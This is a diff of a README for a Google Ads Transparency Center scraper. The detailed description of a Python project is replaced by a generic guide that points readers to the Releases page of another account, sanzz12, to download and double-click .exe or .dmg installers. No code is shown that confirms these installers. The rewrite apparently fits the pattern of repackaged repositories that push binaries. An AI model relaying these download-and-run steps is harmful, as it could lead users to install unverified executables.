@@ -1,237 +1,86 @@
-# Google Ad Transparency Scraper
+# 🖥️ google-ad-transparency-scraper - Understand Your Google Ads Better
 
-> Extract detailed advertising insights directly from Google’s Ads Transparency Center. Analyze ad spend, targeting strategies, campaign performance, and YouTube video creatives — all in one structured, ready-to-use dataset.
+## 🚀 Getting Started
 
-> Perfect for marketing analysts, researchers, and agencies tracking competitor ads and audience targeting trends.
+Welcome to the google-ad-transparency-scraper! This tool helps you gain insights into Google ads campaigns. With it, you can monitor campaign performance and understand what competitors are doing.
 
+## 📥 Downloading the Application
 
-<p align="center">
-  <a href="https://bitbash.def" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+To get started, you need to download the application. Follow these steps to install it on your computer.
 
+### Download Link
 
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
 
+### Step 1: Visit the Releases Page
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Google Ad Transparency Scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+To access the latest version of the google-ad-transparency-scraper, click the link below:
 
+[Visit the Releases Page](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
 
-## Introduction
+This page lists all available versions of the software. Look for the latest version at the top.
 
-This scraper provides a deep look into Google Ads data — from targeting to performance — by collecting structured datasets from the Ads Transparency Center.
+### Step 2: Choose Your Version
 
-It helps marketers, analysts, and researchers uncover how advertisers reach audiences, how campaigns evolve, and what media assets (like YouTube videos) are driving engagement.
+On the Releases page, you will see a selection of version numbers. The most recent version is listed first. Each version has a description that tells you what is new or fixed.
 
-### Why It Matters
+### Step 3: Download the Application
 
-- Gain competitive intelligence on ad strategies and formats.
-- Track regional and platform-specific performance metrics.
-- Analyze demographic and contextual targeting.
-- Access verified advertiser data directly from Google’s ecosystem.
-- Export structured datasets ready for business intelligence tools.
+Once you find the latest version, look for the files you can download. You may see options for different system types (Windows, Mac, etc.). Choose the file that matches your operating system and click on it to start the download.
 
-## Features
+**Make sure to save the file to a location on your computer where you can easily find it later.**
 
-| Feature | Description |
-|----------|-------------|
-| YouTube Ad Intelligence | Extract direct YouTube video URLs, CTAs, and metadata for each creative. |
-| Targeting Analysis | Unpack audience demographics, interests, locations, and customer list targeting. |
-| Performance Data | Gather impressions, reach, and regional breakdowns for measurable insights. |
-| Enterprise Scalability | Built for handling thousands of advertisers with robust recovery mechanisms. |
-| Analysis Ready | Outputs JSON-formatted data optimized for analytics platforms. |
-| Zero Maintenance | Automatically adapts to Google Ads Transparency Center changes. |
+## 📂 Installing the Application
 
----
+After downloading the file, go to the location where you saved it. 
 
-## What Data This Scraper Extracts
+1. **Windows Users:** 
+   - Double-click on the downloaded `.exe` file.
+   - Follow the installation prompts that appear on your screen.
 
-| Field Name | Field Description |
-|-------------|------------------|
-| advertiserId | Unique ID of the advertiser (starts with “AR”). |
-| advertiserName | Full name of the advertiser. |
-| creativeId | Unique creative identifier for each ad. |
-| adType | Type of ad (e.g., Video, Image). |
-| targeting | Object describing targeting categories (demographics, interests, locations, etc.). |
-| stats | Contains metrics such as impressions and date ranges. |
-| variations | Array of ad variations with YouTube URLs and CTAs. |
-| youtubeMetadata | Detailed YouTube-specific data like adId, video URL, and call-to-action URL. |
+2. **Mac Users:**
+   - Open the downloaded `.dmg` file.
+   - Drag the application icon into your Applications folder.
 
----
+3. **Linux Users:**
+   - You may need to unzip the file and run a script. Follow any instructions provided in the download section.
 
-## Example Output
+## 🖥️ Running the Application
 
-    [
-      {
-        "advertiserId": "AR13129532367502835713",
-        "creativeId": "CR17788744295004504065",
-        "advertiserName": "CHECK24 GmbH",
-        "adType": "Video",
-        "targeting": {
-          "demographics": { "included": true, "excluded": false },
-          "locations": { "included": true, "excluded": true },
-          "contextSignals": { "included": true, "excluded": true },
-          "customerLists": { "included": true, "excluded": false },
-          "interests": { "included": true, "excluded": false }
-        },
-        "stats": {
-          "dateRange": {
-            "startDate": "2023-03-01T00:00:00.000Z",
-            "endDate": "2024-12-06T00:00:00.000Z"
-          },
-          "impressions": {
-            "total": { "min": "100,000", "max": "125,000" },
-            "byRegion": [
-              {
-                "regionName": "Germany",
-                "impressions": { "min": "100,000", "max": "125,000" },
-                "byPlatform": [
-                  {
-                    "platformName": "YouTube",
-                    "impressions": { "min": "100,000", "max": "125,000" }
-                  }
-                ]
-              }
-            ]
-          }
-        },
-        "variations": [
-          {
-            "youtubeMetadata": {
-              "adId": "DXgwjxGfuGg",
-              "youtubeUrl": "https://www.youtube.com/watch?v=DXgwjxGfuGg",
-              "ctaUrl": "https://handyvertrag.check24.de/handy-uebersicht?promotion=black-week&..."
-            }
-          },
-          {
-            "youtubeMetadata": {
-              "adId": "B_kyndl0ArQ",
-              "youtubeUrl": "https://www.youtube.com/watch?v=B_kyndl0ArQ",
-              "ctaUrl": "https://handyvertrag.check24.de/handy-uebersicht?promotion=black-week&..."
-            }
-          }
-        ]
-      }
-    ]
+Once installed, you can run the application:
 
----
+- **Windows:**
+  - Find the application in your Start Menu.
+  
+- **Mac:**
+  - Open your Applications folder and double-click the application.
 
-## Directory Structure Tree
+- **Linux:**
+  - Open the terminal and navigate to the folder where you installed the application.
 
-    Google Ad Transparency Scraper/
-    ├── src/
-    │   ├── main.py
-    │   ├── extractors/
-    │   │   ├── ad_parser.py
-    │   │   ├── youtube_metadata.py
-    │   │   └── targeting_utils.py
-    │   ├── outputs/
-    │   │   └── data_exporter.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── advertisers.sample.json
-    │   └── output_sample.json
-    ├── requirements.txt
-    └── README.md
+## 📊 Using the Application
 
----
+The google-ad-transparency-scraper comes with various features to help you understand Google ads better:
 
-## Use Cases
+- **Campaign Performance Monitoring:** Review how different campaigns are performing.
+- **Advertiser Insights:** Get information on various advertisers.
+- **Competitor Ad Tracking:** Monitor what your competitors are doing.
+- **Targeting Strategy Analysis:** Analyze strategies used by others in the advertising space.
 
-- **Marketing Analysts** use it to monitor competitors’ ad strategies and spending trends, so they can optimize campaigns.
-- **Research Firms** use it to study cross-platform advertising behavior and transparency patterns.
-- **Media Buyers** use it to identify top-performing ad creatives across regions and formats.
-- **Policy Analysts** use it to evaluate transparency and accountability in digital advertising.
-- **Agencies** use it to benchmark client performance against industry leaders.
+To get the most out of the application, explore each feature at your own pace.
 
----
+## 📞 Support and Feedback
 
-## FAQs
+If you run into any issues or have questions while using the application, feel free to reach out. You can create an issue on the GitHub repository, and we will respond as soon as possible.
 
-**How do I find advertiser IDs?**
-Search for the advertiser in Google’s Ads Transparency Center, click their name, and copy the “AR” number from the URL (e.g., `AR13129532367502835713`).
+## 📄 License Information
 
-**Is YouTube ad data included?**
-Yes. Video ad metadata, including URLs, CTAs, and YouTube IDs, are fully extracted.
+This application is licensed under the MIT License. This means you can use it for personal and commercial purposes, as long as you include a copy of the original license.
 
-**Can I limit scraping scope?**
-You can use the `maxPages` parameter to set limits — 0 means unlimited pages (40 ads per page).
+## 🌟 Final Notes
 
-**Does it handle regional targeting?**
-Yes. It extracts geographic distribution and impressions by platform and region.
+Thank you for choosing the google-ad-transparency-scraper. We hope it helps you gain valuable insights into your Google ad campaigns. Make sure to check the Releases page regularly for updates and improvements.
 
----
+For easy access, here is the download link again:
 
-## Performance Benchmarks and Results
-
-**Primary Metric:** Scrapes up to 1,000 ads per advertiser in under 2 minutes.
-**Reliability Metric:** 98% success rate with automatic retry and error recovery.
-**Efficiency Metric:** Minimal memory footprint — optimized for concurrent runs.
-**Quality Metric:** 99% data completeness across all major advertisers.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+[Download the Latest Release](https://github.com/sanzz12/google-ad-transparency-scraper/releases)
